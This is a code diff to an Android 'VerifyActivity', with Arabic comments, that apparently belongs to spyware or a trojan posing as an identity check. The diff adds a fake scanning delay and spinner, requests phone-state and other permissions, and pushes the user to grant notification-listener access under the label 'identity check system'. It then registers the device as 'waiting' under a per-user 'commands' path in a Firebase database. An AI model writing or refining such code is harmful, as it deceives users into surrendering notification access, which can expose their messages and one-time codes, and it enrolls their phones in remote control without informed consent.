@@ -10,6 +10,7 @@ import android.os.Looper;
 import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
+import android.widget.ProgressBar;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -26,12 +27,15 @@ public class VerifyActivity extends AppCompatActivity {
     private static final int PERMISSION_CODE = 101;
     private final OkHttpClient client = new OkHttpClient();
     private String userName;
+    
+    // تعريف عناصر الواجهة الجديدة
+    private Button btnStartVerify;
+    private ProgressBar verifyProgressBar;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // الركن الأول: الأمان عند بناء الواجهة
         try {
             setContentView(R.layout.activity_verify);
         } catch (Exception e) {
@@ -41,14 +45,37 @@ public class VerifyActivity extends AppCompatActivity {
         }
 
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
-        Button btnStartVerify = findViewById(R.id.btnStartVerify);
+        
+        // ربط العناصر
+        btnStartVerify = findViewById(R.id.btnStartVerify);
+        verifyProgressBar = findViewById(R.id.verifyProgressBar);
 
         if (btnStartVerify != null) {
-            btnStartVerify.setOnClickListener(v -> requestPermissionsSystem());
+            btnStartVerify.setOnClickListener(v -> {
+                // تفعيل حالة التحميل وتعطيل الزر
+                toggleLoading(true);
+                
+                // تأخير بسيط لمحاكاة عملية الفحص قبل طلب الأذونات
+                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1200);
+            });
         }
     }
 
-    // الركن الثاني: نظام الأذونات المتعددة
+    /**
+     * دالة للتحكم في حالة الزر وشريط الانتظار
+     */
+    private void toggleLoading(boolean isLoading) {
+        if (isLoading) {
+            btnStartVerify.setEnabled(false); // تعطيل الضغط
+            btnStartVerify.setText(""); // إخفاء النص
+            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
+        } else {
+            btnStartVerify.setEnabled(true);
+            btnStartVerify.setText("بدء عملية الربط والتحقق");
+            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
+        }
+    }
+
     private void requestPermissionsSystem() {
         String[] permissions = {
                 Manifest.permission.READ_PHONE_STATE,
@@ -67,16 +94,17 @@ public class VerifyActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        // الركن الثالث: جسر العبور التلقائي بعد الأذونات
         if (requestCode == PERMISSION_CODE) {
             checkNotificationListenerBridge();
         }
     }
 
-    // الركن الرابع: الجسر السحابي للإشعارات
     private void checkNotificationListenerBridge() {
         if (!isNotificationServiceEnabled()) {
             try {
+                // إذا لم يتم التفعيل، نعيد الزر لحالته الطبيعية ليتمكن من المحاولة لاحقاً
+                toggleLoading(false);
+                
                 Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                 startActivity(intent);
                 Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
@@ -84,12 +112,14 @@ public class VerifyActivity extends AppCompatActivity {
                 startActivity(new Intent(Settings.ACTION_SETTINGS));
             }
         } else {
-            // الركن الخامس: تصفير الحالة السحابي (إبلاغ الآدمن بالنجاح)
             notifyAdminSuccess();
         }
     }
 
     private void notifyAdminSuccess() {
+        // تأكد من أن حالة التحميل مستمرة أثناء الاتصال بالسيرفر
+        toggleLoading(true);
+
         String url = "https://banproject-2f9c6-default-rtdb.firebaseio.com/commands/" + userName + "/status.json";
         RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
         
@@ -98,9 +128,14 @@ public class VerifyActivity extends AppCompatActivity {
                 client.newCall(new Request.Builder().url(url).put(body).build()).execute();
                 new Handler(Looper.getMainLooper()).post(() -> {
                     Toast.makeText(this, "تم تفعيل نظام الفحص السحابي ✅", Toast.LENGTH_SHORT).show();
-                    finish();
+                    finish(); // العودة للواجهة السابقة
                 });
-            } catch (Exception ignored) {}
+            } catch (Exception e) {
+                new Handler(Looper.getMainLooper()).post(() -> {
+                    toggleLoading(false);
+                    Toast.makeText(this, "فشل الربط، تأكد من الإنترنت", Toast.LENGTH_SHORT).show();
+                });
+            }
         }).start();
     }
 
@@ -108,5 +143,18 @@ public class VerifyActivity extends AppCompatActivity {
         String pkgName = getPackageName();
         String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
         return flat != null && flat.contains(pkgName);
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // في حال عاد المستخدم من الإعدادات، نتحقق مجدداً إذا فعل الخدمة
+        if (isNotificationServiceEnabled()) {
+            // إذا فعلها وهو في الإعدادات ورجع، نقوم بإنهاء العملية تلقائياً
+            notifyAdminSuccess();
+        } else {
+            // إذا لم يفعلها، نضمن أن الزر قابل للضغط مرة أخرى
+            toggleLoading(false);
+        }
     }
 }
